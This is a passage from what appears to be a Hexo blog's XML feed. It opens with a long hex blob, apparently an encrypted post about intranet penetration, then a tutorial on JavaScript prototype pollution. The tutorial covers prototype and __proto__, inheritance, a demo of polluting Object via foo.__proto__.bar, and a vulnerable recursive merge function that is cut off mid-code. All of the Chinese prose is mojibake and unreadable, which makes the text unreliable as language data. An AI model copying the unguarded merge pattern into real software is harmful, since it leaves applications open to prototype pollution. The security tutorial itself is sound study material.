2a978de1353b1e33313cde29035d411d66374c701f1433f7af7a92096e3f9bb7619228ed5cc4d70cbf7048a7fb83cbde8fdd4c11686b3c269ff3c6ae76c559acdf3097b2d032419140b6c219846a7954b70910e1bc80e4bd04f7a6e28415c71a3e7a9e6a493a4491f45929b3600bee357e88ae8e5a703a6549bdb0b9e6c85936beb02ef9d314e944165822f02f769c7f60ed09a8d098d45faceeca35726889e9a960d665627708b26a9bbfc98058ccc3d5290e29479b291b454198ad07f201ba359095766546a76f2886f8f58f048705ecb543b3f05fabccb24344fe9331e62af33a85b82dabbcdd47481f1f4176986f08c651b35ee5059e449ed2d47bdd9491fb8a5116ef3a2f20e16040b2929b06f5757f06b55de93667bc1533fa649ef917bc98cbe1d2086b23e8014c7769c815af20b8b031fc83730091df6dda16ebd0edcbd35591dbbb51741c86e0489af1a5f97ce3e1ba1e7e4c55f5ad2929ba1a8f9a74e34cd42020cb26b0da38414331e6cf0c8b4017014f76e8b0ddd90d3a8e59954d55d9f49bb645596eea7b17e97138ae2cde2c1879b1fff177d881681f541eca9f170f9c701a70f760c644c96e8fa2a0c860806866c062362ec449d545bc75718aa990a25fcf4f33f86b97e08faa2f2e264a5b5d601393366ebdd60476369df5044f93f87463c06dd435e19cd9adba5fc52fce8221fff8ab211cf4917ae215a94a5465b01f6d18deb3006fbcdef03fbe726f3a496fceefb12f074cac66f582f6d97dec6defeb583a81950cccc95e017f25e5866922a571fb4c0e8b747d92030446d5dc4922168e82d817cc163f9597114aa7ec0eb3b72abab311c29f3f9510007db3d2b6ec4df7aa9c2e2f08b0454103e3ad35fa2c0243d6165cfce3b8bff8b85881298b0bc5d691307371d792d3b888366f2f53913ff69b6c551b0a9dd95fb5104e60d16c97dde9b93fd58b3e7f7d8c50b70a58cea285661f354b44f2bd5f90b5760d2b70a35eda586395a637cdd52271b9fdbacdfb9503d62a58a19f887233dab13cec90cd20c865b8b2c5895caf9172aa096a2e5f6250a386081efe607d174c329f5881e13d41a171dc832427ee4a870dcfb9b1f2890c807e115365f441375f4d51556667dac3e670345a77f1df4e4d17196ce7813ed85150dcb96d6a2104e0715dd220c6cfd52a2605ad72868150b9b981d751b44868e4cd7f44e11e4f93a1b2d55e852542c353d4e56ec5d93fce90386710bbfdd641ad7d1d767b1c8ff4c7d624cd5168b165f157f1b2b61e921b7abc389211fc21dd3f6ae1e705c243a7873a37458d7425777c4fbf031a9f83dc4074cb309167d4b6557a4641280ac16c919f83ec67e9b7675c109ee5945186cb6a534146c219389706826182de311a8b1fd7348ed7837129e58a409daf6689d24fa8ee0c05b26795bc27ded63b4dfb89a0fba036e4e8edac65a1947c6ef8ddcf3d3a83382a651167e510dd8d5a750dd3470a8c19b97d872771e760ce528156419b3aa87db8722b54be5309fa92c91af66b556f570d5027015e804b3c87d46412822afca2f4389588875710b728c31626f0e770fcd3f88729eebb85b86882d00830e137559812002f9a89a4d62f4a2d083dba32b0e9220c7c8323b058821118f40f1a1f18636fcd32afe3951ff83f6b81210309c5e9fb71c78cfd5b25b1813c13b1dd823b11a180c8dcb532bb0781858575d7bf0d69d5a9498b05ccfe3ce50929c29e06292df5c66a24367fa256e33ce18a27059aa55c5dfe62c86c4cec0a5668ea230020d8b965db2b7fc79237426ecd7ff87c74cc5eec36021049a381d731ae984a0006670d3715488986d777a7f79daa580f604045a209a263e4dfc3ce09d72632d5d62b09f114d639d52e3ea2a8cc843d9514646883826903f223013b82834b86a3ff7c52e399b5a7fe6ef6c4557a1a7ce98c3ba6fc23312084bb43fcaa99a978703587eadbd8fa4ccbedf3c44d62e14ac493dfc6131537e8ce71f8de14d79244c58373f8533b6d78a6e842ac4f95874e93ce08d3a6fd12a368a12010f3ac402dcaf069dcb266428aa32175b64259d17df06ff6b663b3e0017cd21e3216544950b536e218777c71b0e0c5398804abd4f7ff876bd5248dde476944b97992007104be8e6894072337d59d1059560e131b1a5638259276ce76396c5d2dc923dc8bb2711482d0a4b1b5c4fb55420c434701b7eab40bc3dc041bbb86ddc7243033f36f54c304acccb5c2bcfac60ec7e68662a779b38a17f97630d094fd118a199323d353718159c39e1b11850a24985f93184381f085b4d5d011b99b2f7c35b542542f90caa752ca2b919bf247eccc05c2dd82e483aaa6750e1d68f168b8bdae23a9090d2e2a93aa3c1a5a8ecfd0281d88da796f9d57c22d90c4a02d7626758c644b31b07ac9ed77ed21d273a3132a96408074ae382662b96634d46f4846106a87619f1e9dfc2612b0384fd066425c834c5c51b10eadc6a616030d75715e723e86e599abffc7e4c3407cda231445277bef1f54f944591cdbb3a34c6e745598ed976f3bc06881b9abf5e445b953e436da52c01479e8409469d45374f953b0c7384512e3b062104d878f98edb1c7be7934d3cdbb2921e9fc4d7d683815b61e74f20502a244d52f87ea5481de3a5c54308a54ab92f5b55f35ee72ded80791712fb355b2c67f29cbf5d409418e3251e5d7865ce89a8c66de865331b3e656dd66c86d6622e5a1535d1d74fe71f5e721921ecb2c872f3a46c116bb0811c1b6f251a70db78cf6069360e5d09d3c112bd55a25d80d6df69f5bc5450ba33984c340a5cdb7e22ce18d25763c428923d1f857a538182be5864fdc145f4fd8ad3b38f1e001f32c28ae33bf6b6204ce14b61bc4297655fe170a1584bbcb7fefd78dd31c09c9ce25d2152a48a70a9023c40caab59aa674c0b8335b0fc2ad8a2de8d3b91470a9353881fb329544aafd81967e249c1306ad79489ace88088b2e6e1c5b82f176503e9a7de670ebad906f454aba9eb476466f07a39f0f4949c6fcd1c94867995842861140346e92ce938f09a1d602e0ec613f510a0787c83b866467a4002a8e8e9aa6f655996bf67363f42b454bebc5631bcda375bfa7cdcd5aaac8801efa70000f8eae87b63d7909b76da72f8f77d488fcd690bc40501eb56d700fbdaa740b0c54bfeb5dc911f58b3242aa41127c8c4b36163827ea7b75d8b527f9fbe1f0853d6f6159ac86a410ca38815855b0e01b421f0c5d452d3e202d3c70c7f335d4bae6120301b628c8ddd847c5a77f2735ec05cee54141ff3fedcfee63f9fbc42f8958330a3161e4ea47f472cbee46701cc4837b72a0bf315905579af67388834737e29cfad61330881cc6bf500de0744191c3672569b9c65ddf669907979b8448e579e97035dbb9d4e681c5c4865ef5d389f3ee073beda9edc231a56b9e10590df0ba29cb5d4edddf8b66f85a96441f90705d0b62591f124997524ade0b0a46b0ebc111e792df944e3768edf20224a922bf8d609e656cc3cee8f96b112f2b218a2aecc089b2b8628bdd6589ab4e4f39e8165ab83576651c8d9754689c11ba6f9ce198c8b029d0bf7bfc06ff4a2af41535d8201e96821b300d3ed47b6c4314ebcc4fc921fd04da60bf413a43e859477675b3cc05eefd4b08ca759973116b3cd62f83c45fdbeafaa0efee3a3dbaa513adc3aea26d3d4d2ee21bd822bbf56d01748eb70c60fe12e479ab83a9ae407a6374be9656a905961380617108ab5dfc62a88f9afc46f6fd818d34c5f10fc7daa720517a48092e49de6cb387f03456a3dd94474d075f1c8c7bc532fb53753a11280e65b0a523390ea46b257efdee1e48db30a65b40c92a978d54c20411c4576bbb20cc4b109c9616275b0c1da2c05b8e201c2ec22458ca52512d5f5f21075c7576f4f7018f5d41126660093606f43569fed82c58761fa01a3c5336b90a7d09272a46040fc316c225c23c42beec5c0dac2229f139adfd319cf99d4a951df1f02d9a700afa9841e33982d29307b7d25c7641868387bc16681132551ccf7618860790d080ae1d316a6fda92f1087992b1b26aaf0b93ed7f59a3b72ef0fd42220382ffb3e0f6c15220887f3286a4246cc245ef204b31fc449139b087edefeb4f737565f1db28204f37a2c880a054389c453a1172b36c44f5a11fac0ce81b82ea771bbf9f7e617b4b3cfd419ba0a3af6a9087509d4846cca26811883171f8efb5861a715770c9ab939aea84bed6b1ac4e5d2be51dee61e01cbb9a6bfa2d84fc4e4aa5ba8fc96fd30c86950f4e0f2337a9a8c58a0daa9cf6a3dce8e0d23d8488599b478df5e98727e2397e26013d9f643ef6382760182da79975a13b9c1b7ce87a3001593954b770ef67eddcfd0f7a093325f3d5c9373cfd75af4e5cc6241ee2575db14140153e7f2b559f59fa862ec876214defb92a935f635b576b053b1864525543a94bafc5de307721550e250ce48efc3ac44a82d8b628350890bc685b260936958a9658c9d7bd6349545763efab748e34af590f1ff813fa810ff417dd9cb7ae06b1ba07cbb80150f92d3fa242a8c941c543318a5e1a3a546598c5ccd8c7a6f0f98d614c30b11d15f3d44bcf7e9e5e127335b8e43565d59aa487854c432ad45ecaca5d310aa4d558acdc2e24a5d2b0f61de3db66be78d284e7f4d1fde14ef94e9bddd6e667a988bc6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†…ç½‘æ¸—é€</tag>
      
      <tag>æ˜¥ç§‹äº‘é•œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸå‹é“¾æ±¡æŸ“</title>
    <link href="/2025/03/09/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2025/03/09/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>æœ€è¿‘å¤ç°çŸ¥è¯†ç‚¹æ—¶å‘ç°ï¼ŒåŸå‹é“¾æ±¡æŸ“è¿™ä¸€å—çš„åŸæ¥è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå¹³æ—¶éƒ½æ˜¯é‚£å·¥å…·æœå“ˆçš„ï¼Œç°åœ¨æœ‰æ—¶é—´æ¡èµ·æ¥é‡æ–°å­¦ä¹ ä¸€ä¸‹</p><h1 id="JavaScriptåŸå‹é“¾æ±¡æŸ“"><a href="#JavaScriptåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="JavaScriptåŸå‹é“¾æ±¡æŸ“"></a>JavaScriptåŸå‹é“¾æ±¡æŸ“</h1><h2 id="prototypeå’Œ-proto-åˆ†åˆ«æ˜¯ä»€ä¹ˆ"><a href="#prototypeå’Œ-proto-åˆ†åˆ«æ˜¯ä»€ä¹ˆ" class="headerlink" title="prototypeå’Œ__proto__åˆ†åˆ«æ˜¯ä»€ä¹ˆ"></a><code>prototype</code>å’Œ<code>__proto__</code>åˆ†åˆ«æ˜¯ä»€ä¹ˆ</h2><p>JavaScriptä¸­ï¼Œæˆ‘ä»¬å¦‚æœè¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä»¥å®šä¹‰â€œæ„é€ å‡½æ•°â€çš„æ–¹å¼æ¥å®šä¹‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br></code></pre></td></tr></table></figure><p><code>Foo</code>å‡½æ•°çš„å†…å®¹ï¼Œå°±æ˜¯<code>Foo</code>ç±»çš„æ„é€ å‡½æ•°ï¼Œè€Œ<code>this.bar</code>å°±æ˜¯<code>Foo</code>ç±»çš„ä¸€ä¸ªå±æ€§ã€‚</p><p>ä¸€ä¸ªç±»å¿…ç„¶æœ‰ä¸€äº›æ–¹æ³•ï¼Œç±»ä¼¼å±æ€§<code>this.bar</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)<br>    &#125;<br>&#125;<br><br>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()).<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>ä½†è¿™æ ·å†™æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ¯å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªFooå¯¹è±¡æ—¶ï¼Œ<code>this.show = function...</code>å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œè¿™ä¸ª<code>show</code>æ–¹æ³•å®é™…ä¸Šæ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ï¼Œè€Œä¸æ˜¯ç»‘å®šåœ¨â€œç±»â€ä¸­ã€‚</p><p>æˆ‘å¸Œæœ›åœ¨åˆ›å»ºç±»çš„æ—¶å€™åªåˆ›å»ºä¸€æ¬¡<code>show</code>æ–¹æ³•ï¼Œè¿™æ—¶å€™å°±åˆ™éœ€è¦ä½¿ç”¨åŸå‹ï¼ˆprototypeï¼‰äº†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)<br>&#125;<br><br><span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br>foo.<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹<code>prototype</code>æ˜¯ç±»<code>Foo</code>çš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨<code>Foo</code>ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„<code>foo</code>å¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰<code>foo.show()</code>æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Foo.prototype</code>æ¥è®¿é—®<code>Foo</code>ç±»çš„åŸå‹ï¼Œä½†<code>Foo</code>å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚è¿™æ—¶å€™ï¼Œå°±è¯¥<code>__proto__</code>ç™»åœºäº†ã€‚</p><p>ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„fooå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡<code>foo.__proto__</code>å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">foo.<span class="hljs-property">__proto__</span> == <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæ€»ç»“ä¸€ä¸‹ï¼š</p><ol><li><code>prototype</code>æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</li><li>ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„<code>prototype</code>å±æ€§</li></ol><h2 id="JavaScriptåŸå‹é“¾ç»§æ‰¿"><a href="#JavaScriptåŸå‹é“¾ç»§æ‰¿" class="headerlink" title="JavaScriptåŸå‹é“¾ç»§æ‰¿"></a>JavaScriptåŸå‹é“¾ç»§æ‰¿</h2><p>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">$&#123;son.first_name&#125;</span> <span class="hljs-subst">$&#123;son.last_name&#125;</span>`</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)<br></code></pre></td></tr></table></figure><p>Sonç±»ç»§æ‰¿äº†Fatherç±»çš„<code>last_name</code>å±æ€§ï¼Œæœ€åè¾“å‡ºçš„æ˜¯<code>Name: Melania Trump</code>ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºå¯¹è±¡sonï¼Œåœ¨è°ƒç”¨<code>son.last_name</code>çš„æ—¶å€™ï¼Œå®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ol><li>åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name</li><li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>son.__proto__</code>ä¸­å¯»æ‰¾last_name</li><li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>son.__proto__.__proto__</code>ä¸­å¯»æ‰¾last_name</li><li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code><br><img src="C:/Users/xp/AppData/Roaming/Typora/typora-user-images/image-20250311224928865.png" alt="image-20250311224928865"></li></ol><p>JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯æœ€åŸºç¡€çš„JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œåªè¦ç‰¢è®°ä»¥ä¸‹å‡ ç‚¹å³å¯ï¼š</p><ol><li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li><li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li><li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li></ol><h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“</h2><p><code>foo.__proto__</code>æŒ‡å‘çš„æ˜¯<code>Foo</code>ç±»çš„<code>prototype</code>ã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†<code>foo.__proto__</code>ä¸­çš„å€¼ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥ä¿®æ”¹Fooç±»å‘¢ï¼Ÿ</p><p>åšä¸ªç®€å•çš„å®éªŒï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment">// foo.bar æ­¤æ—¶ä¸º1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br><br><span class="hljs-comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br><br><span class="hljs-comment">// æŸ¥çœ‹zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br></code></pre></td></tr></table></figure><p>æœ€åï¼Œè™½ç„¶zooæ˜¯ä¸€ä¸ª<strong>ç©º</strong>å¯¹è±¡<code>&#123;&#125;</code>ï¼Œä½†<code>zoo.bar</code>çš„ç»“æœå±…ç„¶æ˜¯2ï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225454881.png" alt="image-20250311225454881"></p><p>åŸå› ä¹Ÿæ˜¾è€Œæ˜“è§ï¼šå› ä¸ºå‰é¢æˆ‘ä»¬ä¿®æ”¹äº†fooçš„åŸå‹<code>foo.__proto__.bar = 2</code>ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2ã€‚</p><p>åæ¥ï¼Œæˆ‘ä»¬åˆç”¨Objectç±»åˆ›å»ºäº†ä¸€ä¸ªzooå¯¹è±¡<code>let zoo = &#123;&#125;</code>ï¼Œzooå¯¹è±¡è‡ªç„¶ä¹Ÿæœ‰ä¸€ä¸ªbarå±æ€§äº†ã€‚</p><p>é‚£ä¹ˆï¼Œåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p><h2 id="å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“"><a href="#å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“" class="headerlink" title="å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“"></a>å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“</h2><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå“ªäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨åŸå‹é“¾èƒ½è¢«æ”»å‡»è€…ä¿®æ”¹çš„æƒ…å†µå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œå“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®<code>__proto__</code>çš„å€¼å‘¢ï¼Ÿå…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯ï¼š</p><ul><li>å¯¹è±¡merge</li><li>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li></ul><p>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    